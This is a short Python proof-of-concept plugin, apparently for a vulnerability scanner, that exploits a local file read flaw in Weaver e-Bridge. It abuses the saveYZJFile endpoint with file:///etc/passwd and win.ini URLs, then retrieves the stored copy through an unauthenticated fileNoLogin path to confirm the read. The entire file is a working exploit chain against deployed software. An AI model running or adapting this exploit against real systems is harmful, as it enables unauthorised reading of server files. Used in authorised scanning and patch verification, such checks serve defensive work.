#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

import json
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    """
    weaver e-bridge lfl
    """
    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url):
                    if path[-1] == '/':
                        pocs = [
                            "wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt",
                            "wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///c://windows/win.ini&fileExt=txt"
                        ]
                        for poc in pocs:
                            url = path + poc
                            async with session.get(url=url) as res:
                                if res != None and res.status == 200:
                                    text = await res.text()
                                    if 'id' in text and 'filepath' in text and 'name' in text:
                                        file_id = json.loads(text).get('id', '')
                                        if file_id:
                                            url2 = path + 'file/fileNoLogin/' + str(file_id)
                                            async with session.get(url=url2) as res2:
                                                if res2 != None and res2.status == 200:
                                                    text2 = await res2.text()
                                                    if '[extensions]' in text2 or 'root:x:' in text2:
                                                        yield url
                                                        return